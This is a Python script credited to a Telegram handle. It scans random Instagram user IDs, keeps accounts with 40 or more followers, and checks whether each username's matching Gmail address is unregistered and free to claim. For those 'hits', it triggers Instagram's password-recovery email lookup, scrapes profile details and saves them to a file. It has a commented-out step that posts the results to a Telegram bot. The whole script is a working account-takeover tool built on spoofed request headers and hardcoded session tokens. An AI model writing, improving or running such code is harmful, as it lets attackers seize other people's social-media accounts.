
E = '\033[1;32m'; G = '\033[1;36m'; Z = '\033[1;31m'; Q = '\033[1;36m'
X = '\033[1;33m'; Z1 = '\033[2;31m'; F = '\033[2;32m'; A = '\033[2;34m'
C = '\033[2;35m'; B = '\x1b[38;5;208m'; Y = '\033[1;34m'; M = '\x1b[1;37m'
S = '\033[1;33m'; U = '\x1b[1;37m'; BRed = '\x1b[1;31m'; BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'; R = '\x1b[1;34m'; BPurple = '\x1b[1;35m'; BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'; BLUE = '\033[94m'; RESET = '\033[0m'; BOLD = '\033[1m'
YELLOW = '\033[93m'; RED = '\033[91m'; GREEN = '\033[92m'; CYAN = '\033[96m'
MAGENTA = '\033[95m'
import os, requests
from requests import get
try: from user_agent import generate_user_agent
except: os.system("pip install user_agent"); from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import randrange, choice
import os
hit_dustu = kotu_insta = orta_mail = 0
BLUE, RESET, BOLD, YELLOW, RED, GREEN, CYAN, MAGENTA = '\033[94m', '\033[0m', '\033[1m', '\033[93m', '\033[91m', '\033[92m', '\033[96m', '\033[95m'
try: from cfonts import render
except: os.system('pip install python-cfonts'); from cfonts import render
THOMAS = render('{meta}', colors=['white', 'blue'], align='center')
print(f'''\n  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
                      {THOMAS}
    ~ Programmer : @JokerPy | Channel: @Theyhates_joker ~
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')
#token = input(f' {Q}({Q}1{Q}) {Q}  𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {F}:   ' + Z)
print("\x1b[1;39m—" * 60)
#ID = input(f' {Q}({Q}2{Q}) {Q}  𝐈𝐃 𝐆𝐢𝐫𝐢𝐧𝐢𝐳 {F} :  ' + Z)
os.system('clear')


from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import re
yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]



def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-arch":"\"\"","sec-ch-ua-bitness":"\"\"","sec-ch-ua-full-version":"\"116.0.5845.72\"","sec-ch-ua-full-version-list":"\"Not)A;Brand\";v=\"24.0.0.0\",\"Chromium\";v=\"116.0.5845.72\"","sec-ch-ua-mobile":"?1","sec-ch-ua-model":"\"ANY-LX2\"","sec-ch-ua-platform":"\"Android\"","sec-ch-ua-platform-version":"\"13.0.0\"","sec-ch-ua-wow64":"?0","sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","x-chrome-connected":"source=Chrome,eligible_for_consistency=true","x-client-data":"CJjbygE=","x-same-domain":"1","Referrer-Policy":"strict-origin-when-cross-origin","user-agent":str(gg())}
    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':gg()}
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()



def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':gg()}
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)




def rest(user):
    try:
        headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB,en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP;csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Accept-Encoding':'gzip,deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'}
        data = {
            'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{user}","guid":"{user}","device_id":"{user}","query":"{user}"}}',
            'ig_sig_key_version': '4',
        }
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).json()
        r = response.get('email', ' h ')
    except Exception as e:
        r = f' h '
    return r






def shelby_info(username, jj):
    global hit_dustu
    hit_dustu += 1
    try:
      
        urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
        
        he={'accept':'*/*','accept-encoding':'gzip, deflate, br','accept-language':'ar','cookie':'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-site','user-agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','x-asbd-id':'198387','x-csrftoken':'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc','x-ig-app-id':'936619743392459','x-ig-www-claim':'0'}

        re = requests.get(urlg, headers=he).json()
        user_data = re.get('data', {}).get('user', {})
        
        biography = user_data.get('biography', 'N/A')
        follower_count = user_data.get('edge_followed_by', {}).get('count', 'N/A')
        following_count = user_data.get('edge_follow', {}).get('count', 'N/A')
        user_id = user_data.get('id', 'N/A')
        full_name = user_data.get('full_name', 'N/A')
        is_private = user_data.get('is_private', 'N/A')
        post_count = user_data.get('edge_owner_to_timeline_media', {}).get('count', 'N/A')

        try:
            date_response = requests.get(f"https://o7aa.pythonanywhere.com/?id={user_id}")
            date = date_response.json().get('date', 'No date available')
        except Exception as e:
            date = 'No date available'
        reset_email = rest(username)        
        porno = f'''
𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇

NAME : ﴾ {full_name} ﴿
USERNAME : ﴾ @{username} ﴿ 
𝐄𝐌𝐀𝐈𝐋 :  ﴾ {username}@gmail.com ﴿ 
FOLLOWERS: ﴾ {follower_count} ﴿
FOLLOWING : ﴾ {following_count} ﴿
YEAR : ﴾ 2014 - 2015 ﴿
ID  : ﴾ {user_id} ﴿        
POST : ﴾ {post_count} ﴿
BIO : ﴾ {biography} ﴿
RESET :  {reset_email}
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌: @JokerPy @Theyhates_joker'''
        print(porno)
        with open('meta-Hit.txt', 'a') as ff:
            ff.write(f'{porno}\n')
        
     #   try:
           # requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={porno}")
    #    except Exception as e:
  #          print(f"  h ")
    except:
        pass
    
        
                      
                      
def thomas(email):
  global orta_mail
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        shelby_info(username,jj)
    else:orta_mail+=1
  except:''
    
    
   
def seks(email):
  global kotu_insta,hit_dustu,orta_mail
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    os.system('clear' if os.name == 'posix' else 'cls')
    
    if pp == '0':
      headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/accounts/signup/email/','user-agent':ua,'x-csrftoken':csrftoken}
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
      if 'email_is_taken' in str(response.text):thomas(email)
      else:kotu_insta+=1
    elif pp == '1':
      headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/?lang=en-US&hl=en-gb','user-agent':ua,'x-csrftoken':csrftoken}
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text
      if '"user":true' in response:thomas(email)
      else:kotu_insta+=1
  except:''
  os.system('clear' if os.name == 'posix' else 'cls')
  print(f''' 
 ___________________________________
{E} [ 1 ] 𝐇𝐢𝐭 ✅  : [ { hit_dustu} ] 
{Z} [ 2 ] BAD INSTAGRAM : [ {kotu_insta} ] 
{X} [ 3 ] BAD EMAIL : [ {orta_mail} ] 
{G} [ 4 ] 𝐄𝐦𝐚𝐢𝐥 : [ {email} ]
___________________________________''')

import requests
from random import choice, randrange
from threading import Thread
from user_agent import generate_user_agent


def ayr_takipc(username, follower_count):
    if follower_count >= 40:  
        pass
        

def thomasvipfree():
    while True:
        try:
            lsd = ''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
            id=str(randrange (1900000000, 2100000000)) 
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/0s9s/',
                'user-agent': str(generate_user_agent()),
                'x-fb-lsd': 'thomas' + lsd,
            }
            data = {
                'lsd': 'thomas' + lsd,
                'variables': f'{{"id":"{id}","relay_header":false,"render_surface":"PROFILE"}}',
                'doc_id': '7397388303713986',
            }
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            response_json = response.json()          
            user_data = response_json.get('data', {}).get('user', {})
            username = user_data.get('username', 'unknown')
            follower_count = user_data.get('follower_count', 0)    
            if follower_count >= 40:
                ayr_takipc(username, follower_count)
                email = username + '@gmail.com'
                seks(email)
        except Exception as e:       
            continue
threads = []
for _ in range(50):  
    t = Thread(target=thomasvipfree)
    t.start()
    threads.append(t)
for t in threads:
    t.join()
  
  # @JokerPy
  
